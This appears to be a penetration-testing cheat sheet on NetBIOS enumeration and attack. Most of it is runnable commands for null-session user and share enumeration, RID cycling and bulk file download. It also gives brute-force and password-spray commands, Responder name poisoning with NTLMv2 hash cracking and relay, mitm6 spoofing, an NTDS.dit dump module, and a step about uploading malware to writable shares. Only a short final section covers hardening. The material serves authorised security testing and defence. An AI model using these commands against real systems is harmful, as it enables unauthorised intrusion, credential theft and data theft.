# NETBIOS ENUMERATION (Port 137/138/139)

## PORT OVERVIEW
```
Port 137 - NetBIOS Name Service (UDP)
Port 138 - NetBIOS Datagram Service (UDP)
Port 139 - NetBIOS Session Service (TCP)
```

## NETBIOS VS SMB
```
NetBIOS (Port 139) - Legacy Windows networking over NetBIOS
SMB (Port 445) - Direct SMB over TCP (modern)

Key differences:
- NetBIOS requires NetBIOS name resolution
- SMB over NetBIOS uses port 139
- Direct SMB uses port 445
- Port 139 is older, more vulnerable
- Both can be used for same attacks
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p137-139 <IP>                         # Service/Version detection
nmap -sU -p137,138 <IP>                         # UDP scan (137, 138)
nmap -sT -p139 <IP>                             # TCP scan (139)
nbtscan <IP>                                    # NetBIOS name scan
```

## NMAP NETBIOS ENUMERATION
```bash
nmap --script "nbstat" -p137 <IP>               # NetBIOS name service
nmap --script "smb-*" -p139 <IP>                # SMB scripts via NetBIOS
nmap --script smb-enum-shares -p139 <IP>        # Enumerate shares
nmap --script smb-enum-users -p139 <IP>         # Enumerate users
nmap --script smb-enum-domains -p139 <IP>       # Enumerate domains
nmap --script smb-enum-groups -p139 <IP>        # Enumerate groups
nmap --script smb-enum-sessions -p139 <IP>      # Enumerate sessions
nmap --script smb-os-discovery -p139 <IP>       # OS discovery
nmap --script smb-security-mode -p139 <IP>      # Security mode
nmap --script smb-vuln-* -p139 <IP>             # Check for vulnerabilities
```

## NETBIOS NAME ENUMERATION
```bash
# nbtscan - Fast NetBIOS name scanner
nbtscan <IP>                                    # Single host
nbtscan 192.168.1.0/24                          # Network range
nbtscan -r 192.168.1.0/24                       # Reverse lookup
nbtscan -v <IP>                                 # Verbose output

# nmblookup - NetBIOS name lookup
nmblookup -A <IP>                               # Query NetBIOS names
nmblookup -S <IP>                               # Status query

# nbtstat (Windows)
nbtstat -A <IP>                                 # Remote machine name table
nbtstat -a <hostname>                           # Using hostname
nbtstat -c                                      # NetBIOS name cache

# Net command (Windows)
net view \\<IP>                                 # List shares
net use \\<IP>\IPC$ "" /user:""                 # Null session
```

## NETBIOS NAME TYPES
```bash
# NetBIOS name suffixes indicate service type

<00> - Workstation Service (computer name)
<03> - Messenger Service (username)
<20> - File Server Service (sharing enabled)
<1B> - Domain Master Browser
<1C> - Domain Controllers
<1D> - Master Browser
<1E> - Browser Service Elections

# Example output:
WORKSTATION    <00>  UNIQUE      # Computer name
WORKSTATION    <20>  UNIQUE      # File sharing enabled
WORKGROUP      <00>  GROUP       # Workgroup/Domain name
WORKGROUP      <1E>  GROUP       # Browser elections
```

## ENUM4LINUX (COMPREHENSIVE ENUMERATION)
```bash
# enum4linux - All-in-one NetBIOS/SMB enumeration tool
enum4linux <IP>                                 # Basic enumeration
enum4linux -a <IP>                              # All enumeration (verbose)
enum4linux -U <IP>                              # User enumeration
enum4linux -S <IP>                              # Share enumeration
enum4linux -G <IP>                              # Group enumeration
enum4linux -P <IP>                              # Password policy
enum4linux -o <IP>                              # OS information
enum4linux -n <IP>                              # Nmblookup
enum4linux -v <IP>                              # Verbose output

# enum4linux with credentials
enum4linux -u <USER> -p <PASSWORD> -a <IP>

# enum4linux-ng (Python rewrite, better output)
enum4linux-ng <IP> -A                           # All enumeration
enum4linux-ng <IP> -A -oY output.yaml           # Output to YAML
```

## NULL SESSION ENUMERATION
```bash
# Null session = anonymous connection with no credentials
# Works on older Windows (2000, XP, 2003) if not hardened

# Test for null session
smbclient -L //<IP> -N                          # List shares (no password)
smbclient //<IP>/IPC$ -N                        # Connect to IPC$ share
rpcclient -U "" -N <IP>                         # RPC null session

# enum4linux null session
enum4linux -a <IP>                              # Attempts null session by default

# Net command (Windows)
net use \\<IP>\IPC$ "" /user:""                 # Establish null session
net view \\<IP>                                 # List shares after null session
```

## RPCCLIENT (RPC ENUMERATION)
```bash
# rpcclient - Windows RPC client tool

# Connect with null session
rpcclient -U "" -N <IP>
rpcclient -U "" <IP>                            # Prompts for empty password

# Connect with credentials
rpcclient -U <USER> <IP>

# Commands after connection:
srvinfo                                         # Server information
enumdomusers                                    # List domain users
enumdomgroups                                   # List domain groups
queryuser <RID>                                 # User details (RID = 500 for admin)
querygroup <RID>                                # Group details
querydominfo                                    # Domain information
enumdomains                                     # List domains
lsaquery                                        # LSA query
lsaenumsid                                      # Enumerate SIDs
lookupsids <SID>                                # Lookup SID
lookupnames <username>                          # Lookup username
netshareenum                                    # Enumerate shares
netshareenumall                                 # Enumerate all shares
netsharegetinfo <share>                         # Share information
```

## USER ENUMERATION
```bash
# Enumerate users via NetBIOS/SMB

# enum4linux
enum4linux -U <IP>                              # User enumeration
enum4linux -u <USER> -p <PASSWORD> -U <IP>      # With credentials

# rpcclient
rpcclient -U "" -N <IP> -c "enumdomusers"       # List users
rpcclient -U "" -N <IP> -c "querydispinfo"      # Detailed user info

# crackmapexec
crackmapexec smb <IP> -u "" -p "" --users       # Null session user enum
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --users

# Nmap
nmap --script smb-enum-users -p139 <IP>
```

## GROUP ENUMERATION
```bash
# Enumerate groups

# rpcclient
rpcclient -U "" -N <IP> -c "enumdomgroups"      # List groups
rpcclient -U "" -N <IP> -c "querygroup 0x200"   # Domain Admins (RID 512)

# enum4linux
enum4linux -G <IP>                              # Group enumeration

# Net command (Windows, after null session)
net group /domain                               # List domain groups
net group "Domain Admins" /domain               # Domain admin members
net localgroup administrators                   # Local administrators
```

## SHARE ENUMERATION
```bash
# Enumerate network shares

# smbclient
smbclient -L //<IP> -N                          # List shares (no password)
smbclient -L //<IP> -U <USER>                   # With credentials

# smbmap
smbmap -H <IP>                                  # List shares
smbmap -H <IP> -u "" -p ""                      # Null session
smbmap -H <IP> -u <USER> -p <PASSWORD>          # With credentials
smbmap -H <IP> -u <USER> -p <PASSWORD> -R       # Recursive listing

# crackmapexec
crackmapexec smb <IP> --shares                  # List shares
crackmapexec smb <IP> -u "" -p "" --shares      # Null session

# enum4linux
enum4linux -S <IP>                              # Share enumeration

# Nmap
nmap --script smb-enum-shares -p139 <IP>
```

## ACCESS SHARES
```bash
# Connect to shares via NetBIOS

# smbclient
smbclient //<IP>/<SHARE> -N                     # No password
smbclient //<IP>/<SHARE> -U <USER>              # With credentials
smbclient //<IP>/C$ -U administrator            # Access C$ admin share

# Commands within smbclient:
smb: \> ls                                      # List files
smb: \> cd <directory>                          # Change directory
smb: \> get <file>                              # Download file
smb: \> put <file>                              # Upload file
smb: \> mget *                                  # Download all files
smb: \> prompt off                              # Disable prompts
smb: \> recurse on                              # Enable recursion
smb: \> mget *                                  # Recursive download

# Mount share (Linux)
mount -t cifs //<IP>/<SHARE> /mnt -o username=<USER>,password=<PASSWORD>
mount -t cifs //<IP>/<SHARE> /mnt -o username=guest,password=

# Net use (Windows)
net use Z: \\<IP>\<SHARE> /user:<USER> <PASSWORD>
net use Z: \\<IP>\<SHARE>                       # Prompts for password
```

## PASSWORD POLICY ENUMERATION
```bash
# Enumerate password policy (useful for password attacks)

# enum4linux
enum4linux -P <IP>                              # Password policy

# rpcclient
rpcclient -U "" -N <IP> -c "getdompwinfo"       # Domain password info

# crackmapexec
crackmapexec smb <IP> --pass-pol                # Password policy

# polenum (dedicated tool)
polenum <IP>                                    # Enumerate password policy
polenum --username <USER> --password <PASSWORD> <IP>

# Important policy info:
# - Minimum password length
# - Password complexity requirements
# - Account lockout threshold
# - Lockout duration
```

## RID CYCLING (USER ENUMERATION)
```bash
# RID cycling - Enumerate users by cycling through RIDs
# Works even when user enumeration is restricted

# rpcclient
for rid in $(seq 500 1100); do
  rpcclient -U "" -N <IP> -c "queryuser $rid" 2>/dev/null | grep "User Name"
done

# enum4linux
enum4linux -r <IP>                              # RID cycling

# ridenum.py
python ridenum.py <IP> 500 1000                 # RID range 500-1000

# Impacket lookupsid
impacket-lookupsid <IP>/<USER>:<PASSWORD>@<IP>
impacket-lookupsid <DOMAIN>/<USER>@<IP>         # Domain user

# crackmapexec
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --rid-brute
```

## PASSWORD ATTACKS
```bash
# Brute force / Password spray via NetBIOS

# Hydra
hydra -l administrator -P passwords.txt <IP> smb
hydra -L users.txt -P passwords.txt <IP> smb

# Medusa
medusa -h <IP> -u administrator -P passwords.txt -M smbnt
medusa -h <IP> -U users.txt -P passwords.txt -M smbnt

# crackmapexec (best option)
crackmapexec smb <IP> -u administrator -p passwords.txt
crackmapexec smb <IP> -u users.txt -p passwords.txt
crackmapexec smb <IP> -u users.txt -p 'Password123!' --continue-on-success  # Password spray

# Metasploit
use auxiliary/scanner/smb/smb_login
set RHOSTS <IP>
set SMBUser administrator
set PASS_FILE passwords.txt
run
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/netbios/nbname            # NetBIOS name scan
use auxiliary/scanner/smb/smb_version           # SMB version
use auxiliary/scanner/smb/smb_enumusers         # Enumerate users
use auxiliary/scanner/smb/smb_enumshares        # Enumerate shares
use auxiliary/scanner/smb/smb_lookupsid         # RID cycling
use auxiliary/scanner/smb/smb_login             # Login scanner
use auxiliary/scanner/smb/pipe_auditor          # Named pipe enumeration
use auxiliary/scanner/smb/pipe_dcerpc_auditor   # DCERPC endpoint enumeration
```

## NETBIOS SPOOFING (LLMNR/NBT-NS)
```bash
# Responder - Capture NetBIOS/LLMNR/MDNS credentials

# Start Responder
responder -I eth0 -wrf                          # Full mode
responder -I eth0 -wrf -v                       # Verbose

# Captures NTLMv2 hashes when:
# - User accesses non-existent share
# - Windows tries to resolve hostname via NetBIOS
# - LLMNR/NBT-NS queries fail over to Responder

# Crack captured hashes
hashcat -m 5600 hashes.txt rockyou.txt          # NTLMv2

# Relay captured authentication
impacket-ntlmrelayx -tf targets.txt -smb2support  # NTLM relay
```

## OS FINGERPRINTING
```bash
# Identify OS via NetBIOS

# Nmap
nmap --script smb-os-discovery -p139 <IP>

# enum4linux
enum4linux -o <IP>                              # OS information

# smbclient
smbclient -L //<IP> -N                          # Banner reveals OS info

# rpcclient
rpcclient -U "" -N <IP> -c "srvinfo"            # Server info (OS, version)
```

## COMMON MISCONFIGURATIONS
```
☐ Null sessions enabled (anonymous access)
☐ Guest account enabled
☐ Weak or no password on administrator
☐ SMB v1 enabled (vulnerable to EternalBlue)
☐ NetBIOS over TCP/IP enabled (not needed on modern networks)
☐ Shares writable by anonymous/guest
☐ IPC$ share accessible anonymously
☐ No account lockout policy
☐ NTLM authentication allowed (relay attacks)
☐ NetBIOS name spoofing possible
```

## QUICK WIN CHECKLIST
```
☐ Test for null session (anonymous access)
☐ Enumerate NetBIOS names (nbtscan)
☐ Run enum4linux -a (comprehensive scan)
☐ Enumerate users (RID cycling if needed)
☐ Enumerate shares (check for writable shares)
☐ Check password policy (for brute force safety)
☐ Enumerate groups (find Domain Admins)
☐ Test default credentials (administrator:password)
☐ Check for SMB v1 (EternalBlue)
☐ Attempt NetBIOS spoofing (Responder)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick NetBIOS enumeration
nbtscan <IP> && enum4linux -a <IP>

# Comprehensive
nmap -sV -p137-139 --script "smb-*" <IP>
enum4linux -a <IP>
crackmapexec smb <IP> -u "" -p "" --shares --users --pass-pol

# With credentials
enum4linux -u <USER> -p <PASSWORD> -a <IP>
rpcclient -U <USER> <IP> -c "enumdomusers; enumdomgroups; netshareenum"
```

## ADVANCED TECHNIQUES
```bash
# NetBIOS name poisoning (MITM)
# Respond to NetBIOS name queries with attacker IP
responder -I eth0 -wrf

# Named pipe enumeration
# Enumerate available named pipes (useful for SMB relay)
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --pipes

# Session hijacking
# If multiple users connected, attempt session hijacking
use auxiliary/admin/smb/psexec_ntdsgrab         # Dump NTDS.dit

# NetBIOS over IPv6
# Windows prefers IPv6, can exploit via mitm6
mitm6 -d <domain>                               # DHCPv6 spoofing
```

## NETBIOS VS SMB COMPARISON
```bash
# Test which protocol is available

# NetBIOS (port 139)
smbclient -L //<IP> -N --option='client min protocol=NT1'

# Direct SMB (port 445)
smbclient -L //<IP> -N

# Check which ports are open
nmap -p139,445 <IP>

# If only 139 is open:
# - Older Windows (2000, XP, 2003)
# - More likely to have null sessions
# - SMB v1 probably enabled

# If only 445 is open:
# - Modern Windows (7, 8, 10, Server 2008+)
# - Null sessions usually disabled
# - May have SMB v2/v3 only
```

## POST-EXPLOITATION (AFTER NETBIOS ACCESS)
```bash
# After gaining NetBIOS access:
1. Enumerate all users and groups
2. Enumerate all shares (look for sensitive data)
3. Access readable shares, download files
4. Check for writable shares (upload malware)
5. Enumerate password policy (plan password attack)
6. RID cycling to find all users
7. Attempt null session attacks
8. Attempt Responder/LLMNR poisoning
9. Check for SMB vulnerabilities (EternalBlue, etc.)
10. Attempt SMB relay attacks

# Full enumeration script
cat > netbios_enum.sh <<'EOF'
#!/bin/bash
IP=$1
echo "[*] NetBIOS Enumeration: $IP"
echo "[*] NetBIOS names:"
nbtscan $IP
echo "[*] Null session test:"
smbclient -L //$IP -N
echo "[*] enum4linux scan:"
enum4linux -a $IP
echo "[*] RPC user enumeration:"
rpcclient -U "" -N $IP -c "enumdomusers"
echo "[*] Share enumeration:"
crackmapexec smb $IP -u "" -p "" --shares
EOF
chmod +x netbios_enum.sh
./netbios_enum.sh <IP>
```

## DISABLE NETBIOS (DEFENSE)
```bash
# NetBIOS is legacy and should be disabled on modern networks

# Windows - Disable NetBIOS over TCP/IP
# Network adapter properties -> TCP/IPv4 -> Advanced -> WINS tab
# -> Disable NetBIOS over TCP/IP

# Registry (Windows)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" /v NodeType /t REG_DWORD /d 2 /f

# Group Policy
# Computer Configuration -> Administrative Templates
# -> Network -> DNS Client -> Turn off multicast name resolution

# Firewall rules
# Block ports 137, 138, 139 from untrusted networks

# Use SMB signing
# Prevents NTLM relay attacks
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 1 /f
```

## NETBIOS SECURITY HARDENING
```bash
# Secure NetBIOS configuration

# Disable null sessions
reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v RestrictAnonymous /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v RestrictAnonymousSAM /t REG_DWORD /d 1 /f

# Restrict access to IPC$ share
# Remove Everyone / Anonymous from share permissions

# Enable account lockout policy
net accounts /lockoutthreshold:5
net accounts /lockoutduration:30
net accounts /lockoutwindow:30

# Require SMB signing
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 1 /f

# Disable SMB v1
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```
